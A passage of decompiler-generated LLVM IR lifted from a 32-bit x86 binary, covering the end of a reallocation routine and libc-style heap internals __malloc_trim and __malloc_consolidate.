dec_label_pc_8050680:                             ; preds = %dec_label_pc_805066d, %dec_label_pc_805067b
  %v0_8050680 = load i32, i32* @edx, align 4
  %v1_8050680 = add i32 %v0_8050680, 8
  store i32 %v1_8050680, i32* @ebx, align 4
  br label %dec_label_pc_80506d1

dec_label_pc_8050685:                             ; preds = %dec_label_pc_805062c
  %v2_8050685 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8050685, i32* %eax.global-to-local, align 4
  %v10_8050688 = icmp ult i32 %v1_8050459, %v2_8050685
  %v1_805068c = icmp eq i1 %v10_8050688, false
  br i1 %v1_805068c, label %dec_label_pc_80506cd, label %dec_label_pc_805068e

dec_label_pc_805068e:                             ; preds = %dec_label_pc_8050685
  %v1_8050695 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050695, i32* %eax.global-to-local, align 4
  store i32 %v1_8050695, i32* %stack_var_-60, align 4
  %v1_8050699 = call i32 @malloc(i32 %v1_8050695)
  store i32 %v1_8050699, i32* %eax.global-to-local, align 4
  store i32 %v1_8050699, i32* @ebx, align 4
  %v1_80506a3 = icmp eq i32 %v1_8050699, 0
  br i1 %v1_80506a3, label %dec_label_pc_80506c9, label %dec_label_pc_80506a7

dec_label_pc_80506a7:                             ; preds = %dec_label_pc_805068e
  %v1_80506ac = add i32 %v1_8050459, -8
  store i32 %v1_80506ac, i32* %eax.global-to-local, align 4
  store i32 %v1_8050699, i32* %stack_var_-60, align 4
  %v3_80506b5 = inttoptr i32 %v1_8050699 to i16*
  %v4_80506b5 = call i32 @memcpy(i16* %v3_80506b5, i32 %tmp7, i32 %v1_80506ac)
  store i32 %v4_80506b5, i32* %eax.global-to-local, align 4
  store i32 %v1_8050699, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80506bf = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80506c4

dec_label_pc_80506c4:                             ; preds = %dec_label_pc_8050594, %dec_label_pc_80506a7
  %storemerge = phi i32 [ %v1_80506bf, %dec_label_pc_80506a7 ], [ %v1_805059e, %dec_label_pc_8050594 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506d1

dec_label_pc_80506c9:                             ; preds = %dec_label_pc_805068e, %dec_label_pc_80504f8
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80506d1

dec_label_pc_80506cd:                             ; preds = %dec_label_pc_8050685, %dec_label_pc_80505fd, %dec_label_pc_8050497
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_80506d1

dec_label_pc_80506d1:                             ; preds = %dec_label_pc_80506c9, %dec_label_pc_80506c4, %dec_label_pc_8050680, %dec_label_pc_80505f5, %dec_label_pc_80506cd
  store i32 %v2_8050406, i32* @eax, align 4
  store i32 %v2_8050406, i32* %stack_var_-60, align 4
  %v2_80506da = call i32 @__pthread_return_void(i32 %v2_8050406, i32 1)
  store i32 %v2_80506da, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506df

dec_label_pc_80506df:                             ; preds = %dec_label_pc_80503ea, %dec_label_pc_80503d6, %dec_label_pc_80506d1
  br label %dec_label_pc_80506e2

dec_label_pc_80506e2:                             ; preds = %dec_label_pc_8050424, %dec_label_pc_80506df
  %v0_80506e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80506e5, i32* %eax.global-to-local, align 4
  store i32 %v0_80503c7, i32* %ebx.global-to-local, align 4
  store i32 %v0_80503c6, i32* @esi, align 4
  ret i32 %v0_80506e5

; uselistorder directives
  uselistorder i32 %v1_8050699, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_805066d, { 1, 0, 2 }
  uselistorder i32 %v2_8050655, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050633, { 1, 0, 2 }
  uselistorder i32 %v1_805060e, { 1, 0, 2 }
  uselistorder i32 %v3_805060b, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80505c9, { 1, 0 }
  uselistorder i32 %v1_805052f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050503, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80504a7, { 1, 0, 2 }
  uselistorder i32 %v3_80504ba, { 0, 2, 1 }
  uselistorder i32 %v2_8050477, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050459, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8050451, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8050446, { 1, 0 }
  uselistorder i32 %v1_8050436, { 0, 2, 1 }
  uselistorder i32 %v0_805041f, { 1, 0 }
  uselistorder i32 %v2_8050406, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80506e2, { 1, 0 }
  uselistorder label %dec_label_pc_80506df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80506d1, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80506c4, { 1, 0 }
  uselistorder label %dec_label_pc_8050680, { 1, 0 }
  uselistorder label %dec_label_pc_805066d, { 1, 0 }
  uselistorder label %dec_label_pc_80505f5, { 1, 0 }
  uselistorder label %dec_label_pc_80505a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050594, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80504ed, { 1, 0 }
  uselistorder label %dec_label_pc_805044d, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80506f3 = load i32, i32* @edx, align 4
  store i32 %v0_80506f3, i32* %ebp.global-to-local, align 4
  %v1_80506f5 = add i32 %v0_80506f3, 860
  %v2_80506f5 = inttoptr i32 %v1_80506f5 to i32*
  %v3_80506f5 = load i32, i32* %v2_80506f5, align 4
  store i32 %v3_80506f5, i32* @ecx, align 4
  %v1_80506fb = add i32 %v0_80506f3, 44
  %v2_80506fb = inttoptr i32 %v1_80506fb to i32*
  %v3_80506fb = load i32, i32* %v2_80506fb, align 4
  %v1_80506fe = add i32 %v3_80506fb, 4
  %v2_80506fe = inttoptr i32 %v1_80506fe to i32*
  %v3_80506fe = load i32, i32* %v2_80506fe, align 4
  %v1_8050701 = and i32 %v3_80506fe, -4
  store i32 %v1_8050701, i32* @esi, align 4
  %v1_8050706 = load i32, i32* @eax, align 4
  %v2_8050706 = add i32 %v3_80506f5, -17
  %v2_8050708 = add i32 %v2_8050706, %v1_8050701
  %v3_8050708 = sub i32 %v2_8050708, %v1_8050706
  %div = udiv i32 %v3_8050708, %v3_80506f5
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050708, %v3_80506f5
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050710 = add i32 %div, -1
  %v4_8050713 = mul i32 %v1_8050710, %v3_80506f5
  store i32 %v4_8050713, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8050713, 1
  br i1 %tmp11, label %dec_label_pc_805076f, label %dec_label_pc_805071a

dec_label_pc_805071a:                             ; preds = %entry
  %v1_805071f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805071f, i32* %edi.global-to-local, align 4
  %v0_8050726 = load i32, i32* @esi, align 4
  store i32 %v0_8050726, i32* %eax.global-to-local, align 4
  %v1_8050728 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050728 = add i32 %v1_8050728, 44
  %v3_8050728 = inttoptr i32 %v2_8050728 to i32*
  %v4_8050728 = load i32, i32* %v3_8050728, align 4
  %v5_8050728 = add i32 %v4_8050728, %v0_8050726
  store i32 %v5_8050728, i32* %eax.global-to-local, align 4
  %v12_805072e = icmp eq i32 %v1_805071f, %v5_8050728
  %v1_8050730 = icmp eq i1 %v12_805072e, false
  br i1 %v1_8050730, label %dec_label_pc_805076f, label %dec_label_pc_8050732

dec_label_pc_8050732:                             ; preds = %dec_label_pc_805071a
  %v1_8050735 = sub i32 0, %v4_8050713
  store i32 %v1_8050735, i32* @ebx, align 4
  %v1_8050738 = call i32 @__GI_sbrk(i32 %v1_8050735)
  store i32 %v1_8050738, i32* %eax.global-to-local, align 4
  %v1_8050744 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050744, i32* %eax.global-to-local, align 4
  %v10_805074c = icmp eq i32 %v1_8050744, -1
  br i1 %v10_805074c, label %dec_label_pc_805076f, label %dec_label_pc_8050751

dec_label_pc_8050751:                             ; preds = %dec_label_pc_8050732
  %v0_8050751 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050753 = sub i32 %v0_8050751, %v1_8050744
  %v12_8050753 = icmp eq i32 %v2_8050753, 0
  store i32 %v2_8050753, i32* @ecx, align 4
  br i1 %v12_8050753, label %dec_label_pc_805076f, label %dec_label_pc_8050757

dec_label_pc_8050757:                             ; preds = %dec_label_pc_8050751
  %v0_8050757 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050757 = add i32 %v0_8050757, 44
  %v2_8050757 = inttoptr i32 %v1_8050757 to i32*
  %v3_8050757 = load i32, i32* %v2_8050757, align 4
  store i32 %v3_8050757, i32* %eax.global-to-local, align 4
  %v1_805075a = add i32 %v0_8050757, 872
  %v2_805075a = inttoptr i32 %v1_805075a to i32*
  %v3_805075a = load i32, i32* %v2_805075a, align 4
  %v5_805075a = sub i32 %v3_805075a, %v2_8050753
  store i32 %v5_805075a, i32* %v2_805075a, align 4
  %v0_8050760 = load i32, i32* @esi, align 4
  %v1_8050760 = load i32, i32* @ecx, align 4
  %v2_8050760 = sub i32 %v0_8050760, %v1_8050760
  %v1_8050762 = or i32 %v2_8050760, 1
  %v1_8050765 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050765 = add i32 %v1_8050765, 4
  %v3_8050765 = inttoptr i32 %v2_8050765 to i32*
  store i32 %v1_8050762, i32* %v3_8050765, align 4
  br label %dec_label_pc_8050771

dec_label_pc_805076f:                             ; preds = %dec_label_pc_8050751, %dec_label_pc_8050732, %dec_label_pc_805071a, %entry
  br label %dec_label_pc_8050771

dec_label_pc_8050771:                             ; preds = %dec_label_pc_8050757, %dec_label_pc_805076f
  %storemerge = phi i32 [ 1, %dec_label_pc_8050757 ], [ 0, %dec_label_pc_805076f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050744, { 1, 0, 2 }
  uselistorder i32 %v4_8050713, { 1, 2, 0 }
  uselistorder i32 %v3_80506f5, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050771, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_805077a = load i32, i32* @edi, align 4
  %v0_805077b = load i32, i32* @esi, align 4
  %v0_805077c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8050784 = load i32, i32* %arg1, align 4
  store i32 %v2_8050784, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805078b = icmp eq i32 %v2_8050784, 0
  br i1 %v1_805078b, label %dec_label_pc_80508b4.preheader, label %dec_label_pc_8050793

dec_label_pc_80508b4.preheader:                   ; preds = %entry
  %v3_80508a9 = add i32 %tmp11, 44
  br label %dec_label_pc_80508a5

dec_label_pc_8050793:                             ; preds = %entry
  %v1_8050797 = and i32 %v2_8050784, -3
  store i32 %v1_8050797, i32* %arg1, align 4
  %v1_805079c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_80507a7 = add i32 %tmp11, 4
  store i32 %v1_80507a7, i32* %eax.global-to-local, align 4
  %v2_80507b2 = load i32, i32* %arg1, align 4
  %v2_80507b8 = udiv i32 %v2_80507b2, 8
  %v2_80507bb = mul nuw i32 %v2_80507b8, 4
  %v3_80507bb = add i32 %tmp11, -4
  %v4_80507bb = add i32 %v3_80507bb, %v2_80507bb
  store i32 %v4_80507bb, i32* %eax.global-to-local, align 4
  %v2_8050882 = add i32 %tmp11, 44
  %v3_8050882 = inttoptr i32 %v2_8050882 to i32*
  %v1_8050855 = add i32 %tmp11, 60
  %v2_8050855 = inttoptr i32 %v1_8050855 to i32*
  br label %dec_label_pc_80507c3

dec_label_pc_80507c3:                             ; preds = %dec_label_pc_805089b, %dec_label_pc_8050793
  %v0_80507d1 = phi i32 [ %v1_80507a7, %dec_label_pc_8050793 ], [ %v4_805089b, %dec_label_pc_805089b ]
  store i32 %v0_80507d1, i32* %eax.global-to-local, align 4
  %v1_80507c7 = inttoptr i32 %v0_80507d1 to i32*
  %v2_80507c7 = load i32, i32* %v1_80507c7, align 4
  store i32 %v2_80507c7, i32* @ecx, align 4
  %v1_80507c9 = icmp eq i32 %v2_80507c7, 0
  br i1 %v1_80507c9, label %dec_label_pc_8050891, label %dec_label_pc_80507d1

dec_label_pc_80507d1:                             ; preds = %dec_label_pc_80507c3
  store i32 0, i32* %v1_80507c7, align 4
  %v0_80507d7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80507d7

dec_label_pc_80507d7:                             ; preds = %dec_label_pc_8050885, %dec_label_pc_80507d1
  %v0_80507f4 = phi i32 [ %v3_80507d7, %dec_label_pc_8050885 ], [ %v0_80507d7.pre, %dec_label_pc_80507d1 ]
  %v1_80507d7 = add i32 %v0_80507f4, 8
  %v2_80507d7 = inttoptr i32 %v1_80507d7 to i32*
  %v3_80507d7 = load i32, i32* %v2_80507d7, align 4
  store i32 %v3_80507d7, i32* %edx.global-to-local, align 4
  %v1_80507de = add i32 %v0_80507f4, 4
  %v2_80507de = inttoptr i32 %v1_80507de to i32*
  %v3_80507de = load i32, i32* %v2_80507de, align 4
  store i32 %v3_80507de, i32* %eax.global-to-local, align 4
  %v1_80507e3 = and i32 %v3_80507de, -2
  store i32 %v1_80507e3, i32* @edi, align 4
  %v2_80507e6 = urem i32 %v3_80507de, 2
  %v3_80507e6 = icmp eq i32 %v2_80507e6, 0
  %v2_80507e8 = add i32 %v1_80507e3, %v0_80507f4
  store i32 %v2_80507e8, i32* @ebx, align 4
  %v1_80507eb = add i32 %v2_80507e8, 4
  %v2_80507eb = inttoptr i32 %v1_80507eb to i32*
  %v3_80507eb = load i32, i32* %v2_80507eb, align 4
  store i32 %v3_80507eb, i32* %edx.global-to-local, align 4
  %v1_80507f2 = icmp eq i1 %v3_80507e6, false
  br i1 %v1_80507f2, label %dec_label_pc_8050814, label %dec_label_pc_80507f4

dec_label_pc_80507f4:                             ; preds = %dec_label_pc_80507d7
  %v1_80507f4 = inttoptr i32 %v0_80507f4 to i32*
  %v2_80507f4 = load i32, i32* %v1_80507f4, align 4
  store i32 %v2_80507f4, i32* %ebp.global-to-local, align 4
  %v2_80507f8 = sub i32 %v0_80507f4, %v2_80507f4
  store i32 %v2_80507f8, i32* %eax.global-to-local, align 4
  %v1_80507fa = add i32 %v2_80507f8, 8
  %v2_80507fa = inttoptr i32 %v1_80507fa to i32*
  %v3_80507fa = load i32, i32* %v2_80507fa, align 4
  store i32 %v3_80507fa, i32* @esi, align 4
  %v1_80507fd = add i32 %v2_80507f8, 12
  %v2_80507fd = inttoptr i32 %v1_80507fd to i32*
  %v3_80507fd = load i32, i32* %v2_80507fd, align 4
  store i32 %v3_80507fd, i32* %edx.global-to-local, align 4
  %v1_8050800 = add i32 %v3_80507fa, 12
  %v2_8050800 = inttoptr i32 %v1_8050800 to i32*
  %v3_8050800 = load i32, i32* %v2_8050800, align 4
  store i32 %v3_8050800, i32* @ecx, align 4
  %v12_8050803 = icmp eq i32 %v3_8050800, %v2_80507f8
  %v1_8050805 = icmp eq i1 %v12_8050803, false
  br i1 %v1_8050805, label %dec_label_pc_8050844, label %dec_label_pc_8050807

dec_label_pc_8050807:                             ; preds = %dec_label_pc_80507f4
  %v1_8050807 = add i32 %v3_80507fd, 8
  %v2_8050807 = inttoptr i32 %v1_8050807 to i32*
  %v3_8050807 = load i32, i32* %v2_8050807, align 4
  %v15_8050807 = icmp eq i32 %v3_8050807, %v3_8050800
  %v1_805080a = icmp eq i1 %v15_8050807, false
  br i1 %v1_805080a, label %dec_label_pc_8050844, label %dec_label_pc_805080c

dec_label_pc_805080c:                             ; preds = %dec_label_pc_8050807
  %v2_805080c = add i32 %v2_80507f4, %v1_80507e3
  store i32 %v2_805080c, i32* @edi, align 4
  store i32 %v3_80507fd, i32* %v2_8050800, align 4
  %v0_8050811 = load i32, i32* @esi, align 4
  %v1_8050811 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050811 = add i32 %v1_8050811, 8
  %v3_8050811 = inttoptr i32 %v2_8050811 to i32*
  store i32 %v0_8050811, i32* %v3_8050811, align 4
  %v0_805081f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050814

dec_label_pc_8050814:                             ; preds = %dec_label_pc_80507d7, %dec_label_pc_805080c
  %v1_8050828 = phi i32 [ %v2_80507e8, %dec_label_pc_80507d7 ], [ %v0_805081f.pre, %dec_label_pc_805080c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805081c = and i32 %v3_80507eb, -4
  store i32 %v1_805081c, i32* %ebp.global-to-local, align 4
  %v4_805081f = load i32, i32* %v3_8050882, align 4
  %v15_805081f = icmp eq i32 %v1_8050828, %v4_805081f
  br i1 %v15_805081f, label %dec_label_pc_8050875, label %dec_label_pc_8050824

dec_label_pc_8050824:                             ; preds = %dec_label_pc_8050814
  %v2_8050824 = add i32 %v1_8050828, 4
  %v3_8050824 = add i32 %v2_8050824, %v1_805081c
  %v4_8050824 = inttoptr i32 %v3_8050824 to i32*
  %v5_8050824 = load i32, i32* %v4_8050824, align 4
  store i32 %v5_8050824, i32* %eax.global-to-local, align 4
  %v3_8050828 = inttoptr i32 %v2_8050824 to i32*
  store i32 %v1_805081c, i32* %v3_8050828, align 4
  %v0_805082b = load i32, i32* %eax.global-to-local, align 4
  %v1_805082b = urem i32 %v0_805082b, 2
  %v2_805082b = icmp eq i32 %v1_805082b, 0
  store i32 %v1_805082b, i32* %eax.global-to-local, align 4
  %v1_8050830 = icmp eq i1 %v2_805082b, false
  br i1 %v1_8050830, label %dec_label_pc_8050851, label %dec_label_pc_8050832

dec_label_pc_8050832:                             ; preds = %dec_label_pc_8050824
  %v0_8050832 = load i32, i32* @ebx, align 4
  %v1_8050832 = add i32 %v0_8050832, 8
  %v2_8050832 = inttoptr i32 %v1_8050832 to i32*
  %v3_8050832 = load i32, i32* %v2_8050832, align 4
  store i32 %v3_8050832, i32* @edx, align 4
  %v1_8050835 = add i32 %v0_8050832, 12
  %v2_8050835 = inttoptr i32 %v1_8050835 to i32*
  %v3_8050835 = load i32, i32* %v2_8050835, align 4
  store i32 %v3_8050835, i32* %eax.global-to-local, align 4
  %v1_8050838 = add i32 %v3_8050832, 12
  %v2_8050838 = inttoptr i32 %v1_8050838 to i32*
  %v3_8050838 = load i32, i32* %v2_8050838, align 4
  store i32 %v3_8050838, i32* @esi, align 4
  %v12_805083b = icmp eq i32 %v3_8050838, %v0_8050832
  %v1_805083d = icmp eq i1 %v12_805083b, false
  br i1 %v1_805083d, label %dec_label_pc_8050844, label %dec_label_pc_805083f

dec_label_pc_805083f:                             ; preds = %dec_label_pc_8050832
  %v1_805083f = add i32 %v3_8050835, 8
  %v2_805083f = inttoptr i32 %v1_805083f to i32*
  %v3_805083f = load i32, i32* %v2_805083f, align 4
  %v15_805083f = icmp eq i32 %v3_805083f, %v3_8050838
  br i1 %v15_805083f, label %dec_label_pc_8050849, label %dec_label_pc_8050844

dec_label_pc_8050844:                             ; preds = %dec_label_pc_805083f, %dec_label_pc_8050832, %dec_label_pc_8050807, %dec_label_pc_80507f4
  %v0_8050844 = call i32 @abort()
  store i32 %v0_8050844, i32* %eax.global-to-local, align 4
  %v1_805084b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050849

dec_label_pc_8050849:                             ; preds = %dec_label_pc_805083f, %dec_label_pc_8050844
  %v1_805084b = phi i32 [ %v3_8050832, %dec_label_pc_805083f ], [ %v1_805084b.pre, %dec_label_pc_8050844 ]
  %v0_805084b = phi i32 [ %v3_8050835, %dec_label_pc_805083f ], [ %v0_8050844, %dec_label_pc_8050844 ]
  %v0_8050849 = load i32, i32* @edi, align 4
  %v1_8050849 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050849 = add i32 %v1_8050849, %v0_8050849
  store i32 %v2_8050849, i32* @edi, align 4
  %v2_805084b = add i32 %v1_805084b, 12
  %v3_805084b = inttoptr i32 %v2_805084b to i32*
  store i32 %v0_805084b, i32* %v3_805084b, align 4
  %v0_805084e = load i32, i32* @edx, align 4
  %v1_805084e = load i32, i32* %eax.global-to-local, align 4
  %v2_805084e = add i32 %v1_805084e, 8
  %v3_805084e = inttoptr i32 %v2_805084e to i32*
  store i32 %v0_805084e, i32* %v3_805084e, align 4
  br label %dec_label_pc_8050851

dec_label_pc_8050851:                             ; preds = %dec_label_pc_8050824, %dec_label_pc_8050849
  store i32 %v1_805079c, i32* %eax.global-to-local, align 4
  %v3_8050855 = load i32, i32* %v2_8050855, align 4
  store i32 %v3_8050855, i32* @edx, align 4
  %v0_8050858 = load i32, i32* @ecx, align 4
  store i32 %v0_8050858, i32* %v2_8050855, align 4
  %v0_805085b = load i32, i32* @edi, align 4
  %v1_805085d = or i32 %v0_805085b, 1
  store i32 %v1_805085d, i32* %eax.global-to-local, align 4
  %v0_8050860 = load i32, i32* @ecx, align 4
  %v1_8050860 = load i32, i32* @edx, align 4
  %v2_8050860 = add i32 %v1_8050860, 12
  %v3_8050860 = inttoptr i32 %v2_8050860 to i32*
  store i32 %v0_8050860, i32* %v3_8050860, align 4
  %v0_8050863 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050863 = load i32, i32* @ecx, align 4
  %v2_8050863 = add i32 %v1_8050863, 4
  %v3_8050863 = inttoptr i32 %v2_8050863 to i32*
  store i32 %v0_8050863, i32* %v3_8050863, align 4
  store i32 %v1_805079c, i32* %eax.global-to-local, align 4
  %v0_805086a = load i32, i32* @edx, align 4
  %v1_805086a = load i32, i32* @ecx, align 4
  %v2_805086a = add i32 %v1_805086a, 8
  %v3_805086a = inttoptr i32 %v2_805086a to i32*
  store i32 %v0_805086a, i32* %v3_805086a, align 4
  %v0_805086d = load i32, i32* %eax.global-to-local, align 4
  %v1_805086d = load i32, i32* @ecx, align 4
  %v2_805086d = add i32 %v1_805086d, 12
  %v3_805086d = inttoptr i32 %v2_805086d to i32*
  store i32 %v0_805086d, i32* %v3_805086d, align 4
  %v0_8050870 = load i32, i32* @edi, align 4
  %v1_8050870 = load i32, i32* @ecx, align 4
  %v3_8050870 = add i32 %v1_8050870, %v0_8050870
  %v4_8050870 = inttoptr i32 %v3_8050870 to i32*
  store i32 %v0_8050870, i32* %v4_8050870, align 4
  br label %dec_label_pc_8050885

dec_label_pc_8050875:                             ; preds = %dec_label_pc_8050814
  %v0_8050875 = load i32, i32* @edi, align 4
  %v2_8050875 = add i32 %v0_8050875, %v1_805081c
  %v1_8050878 = or i32 %v2_8050875, 1
  store i32 %v1_8050878, i32* %eax.global-to-local, align 4
  %v1_805087b = load i32, i32* @ecx, align 4
  %v2_805087b = add i32 %v1_805087b, 4
  %v3_805087b = inttoptr i32 %v2_805087b to i32*
  store i32 %v1_8050878, i32* %v3_805087b, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8050882 = load i32, i32* @ecx, align 4
  store i32 %v0_8050882, i32* %v3_8050882, align 4
  br label %dec_label_pc_8050885

dec_label_pc_8050885:                             ; preds = %dec_label_pc_8050851, %dec_label_pc_8050875
  store i32 %v3_80507d7, i32* @ecx, align 4
  %v1_8050889 = icmp eq i32 %v3_80507d7, 0
  %v1_805088b = icmp eq i1 %v1_8050889, false
  br i1 %v1_805088b, label %dec_label_pc_80507d7, label %dec_label_pc_8050891

dec_label_pc_8050891:                             ; preds = %dec_label_pc_8050885, %dec_label_pc_80507c3
  store i32 %v4_80507bb, i32* @ecx, align 4
  %v15_8050895 = icmp eq i32 %v0_80507d1, %v4_80507bb
  br i1 %v15_8050895, label %dec_label_pc_8050919, label %dec_label_pc_805089b

dec_label_pc_805089b:                             ; preds = %dec_label_pc_8050891
  %v4_805089b = add i32 %v0_80507d1, 4
  br label %dec_label_pc_80507c3

dec_label_pc_80508a5:                             ; preds = %dec_label_pc_80508b4.preheader, %dec_label_pc_80508a5
  %v1_80508a920 = phi i32 [ 1, %dec_label_pc_80508b4.preheader ], [ %v0_80508b4.pre, %dec_label_pc_80508a5 ]
  %v2_80508a9 = mul i32 %v1_80508a920, 8
  %v4_80508a9 = add i32 %v3_80508a9, %v2_80508a9
  store i32 %v4_80508a9, i32* %eax.global-to-local, align 4
  %v1_80508ad = add i32 %v1_80508a920, 1
  store i32 %v1_80508ad, i32* %edx.global-to-local, align 4
  %v2_80508ae = add i32 %v4_80508a9, 12
  %v3_80508ae = inttoptr i32 %v2_80508ae to i32*
  store i32 %v4_80508a9, i32* %v3_80508ae, align 4
  %v0_80508b1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80508b1 = add i32 %v0_80508b1, 8
  %v3_80508b1 = inttoptr i32 %v2_80508b1 to i32*
  store i32 %v0_80508b1, i32* %v3_80508b1, align 4
  %v0_80508b4.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80508b7 = icmp sgt i32 %v0_80508b4.pre, 95
  br i1 %v7_80508b7, label %dec_label_pc_80508b9, label %dec_label_pc_80508a5

dec_label_pc_80508b9:                             ; preds = %dec_label_pc_80508a5
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80508bd = add i32 %tmp11, 864
  %v2_80508bd = inttoptr i32 %v1_80508bd to i32*
  %v3_80508bd = load i32, i32* %v2_80508bd, align 4
  %v4_80508bd = or i32 %v3_80508bd, 1
  store i32 %v4_80508bd, i32* %v2_80508bd, align 4
  %v0_80508c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508c4 = add i32 %v0_80508c4, 840
  %v2_80508c4 = inttoptr i32 %v1_80508c4 to i32*
  store i32 0, i32* %v2_80508c4, align 4
  %v0_80508ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80508ce = add i32 %v0_80508ce, 852
  %v2_80508ce = inttoptr i32 %v1_80508ce to i32*
  store i32 65536, i32* %v2_80508ce, align 4
  %v0_80508d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508d8 = add i32 %v0_80508d8, 844
  %v2_80508d8 = inttoptr i32 %v1_80508d8 to i32*
  store i32 262144, i32* %v2_80508d8, align 4
  %v0_80508e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508e2 = add i32 %v0_80508e2, 836
  %v2_80508e2 = inttoptr i32 %v1_80508e2 to i32*
  store i32 262144, i32* %v2_80508e2, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_80508f3 = load i32, i32* %arg1, align 4
  %v1_80508f5 = urem i32 %v2_80508f3, 4
  %v1_80508f8 = or i32 %v1_80508f5, 72
  store i32 %v1_80508f8, i32* %arg1, align 4
  %v0_80508fd = load i32, i32* @edx, align 4
  %v1_80508ff = add i32 %v0_80508fd, 52
  store i32 %v1_80508ff, i32* %eax.global-to-local, align 4
  %v2_8050902 = add i32 %v0_80508fd, 44
  %v3_8050902 = inttoptr i32 %v2_8050902 to i32*
  store i32 %v1_80508ff, i32* %v3_8050902, align 4
  %v1_8050907 = call i32 @sysconf(i32 30)
  store i32 %v1_8050907, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8050913 = add i32 %tmp11, 860
  %v3_8050913 = inttoptr i32 %v2_8050913 to i32*
  store i32 %v1_8050907, i32* %v3_8050913, align 4
  br label %dec_label_pc_8050919

dec_label_pc_8050919:                             ; preds = %dec_label_pc_8050891, %dec_label_pc_80508b9
  store i32 %v0_805077c, i32* @ebx, align 4
  store i32 %v0_805077b, i32* @esi, align 4
  store i32 %v0_805077a, i32* @edi, align 4
  %v0_8050920 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050920

; uselistorder directives
  uselistorder i32 %v0_80508b1, { 1, 0 }
  uselistorder i32 %v0_8050870, { 1, 0 }
  uselistorder i32 %v1_805082b, { 1, 0 }
  uselistorder i32 %v2_8050824, { 1, 0 }
  uselistorder i32 %v1_805081c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050828, { 1, 0 }
  uselistorder i32 %v3_80507d7, { 2, 1, 3, 0 }
